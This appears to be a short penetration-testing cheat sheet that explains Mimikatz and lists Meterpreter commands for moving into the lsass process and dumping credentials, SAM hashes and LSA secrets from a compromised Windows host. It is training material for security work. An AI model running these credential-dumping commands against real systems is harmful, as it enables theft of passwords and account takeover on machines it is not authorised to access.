# Dumping Hashes With Mimikatz

## Explanation

### Mimikatz

- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.

- The SAM (Security Account Manager) database, is a database file on Windows systems stores hashed user passwords.

- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.

- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

! Mimikatz will require elevated privileges in order to run correctly. !

## Technics

1. Migrate into lsass process : 
```
meterpreter > migrate -N lsass.exe
```

2. Load Kiwi module on Metasploit Framework : 
```
meterpreter > load kiwi
```

3. Dump all hash :
```
meterpreter > creds_all
```

4. Dump all windows users hashes :
```
meterpreter > lsa_dump_sam
```

5. Dump LSA secrets :
```
meterpreter > lsa_dump_secrets
```